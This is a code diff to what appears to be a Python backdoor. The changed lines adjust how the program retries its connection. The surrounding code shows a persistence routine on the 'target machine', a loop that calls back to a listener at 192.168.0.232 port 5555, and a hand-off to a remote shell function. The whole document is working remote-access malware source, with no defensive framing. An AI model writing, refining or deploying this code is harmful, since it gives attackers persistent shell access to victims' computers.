@@ -63,17 +63,17 @@ def persist(reg_name, copy_name):
     except:
         reliable_send('[-] Error creating persistence with target machine')
 
+
 def connection():
     while True:
-        time.sleep(20)
         try:
             s.connect(('192.168.0.232', 5555))
             shell()
             s.close()
             break
         except:
+            time.sleep(20)
             connection()
-
 
 
 def shell():
@@ -121,5 +121,5 @@ def shell():
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection()
 
-#s.connect(('192.168.0.232', 5555))
-#shell()
+# s.connect(('192.168.0.232', 5555))
+# shell()
